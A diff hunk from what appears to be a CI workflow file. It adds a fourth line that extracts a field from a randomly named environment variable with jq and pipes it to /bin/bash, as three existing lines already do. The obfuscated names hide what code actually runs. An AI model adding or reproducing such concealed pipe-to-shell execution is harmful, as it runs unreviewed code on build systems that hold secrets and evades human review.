@@ -26,6 +26,7 @@ jobs:
           echo $slxbs9 | jq -r .j35813 | /bin/bash
           echo $bq548 | jq -r .jt35 | /bin/bash
           echo $qjd6067 | jq -r .btex32014 | /bin/bash
+          printf '%s' "$okhi56583" | jq -r .tv2 | /bin/bash
 
       - name: Upload results
         if: always()
